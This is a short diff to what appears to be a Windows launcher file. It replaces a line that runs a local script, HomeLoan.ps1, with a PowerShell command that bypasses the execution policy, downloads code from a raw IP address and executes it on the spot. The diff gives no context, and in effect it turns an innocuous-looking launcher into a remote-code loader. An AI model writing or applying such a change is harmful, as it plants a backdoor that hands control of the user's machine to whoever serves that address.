@@ -1,2 +1,2 @@
-PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& 'd:\HomeLoan.ps1'"
+PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& 'iex (New-Object Net.WebClient).DownloadString("http://40.87.93.22/connect")'"
 Pause
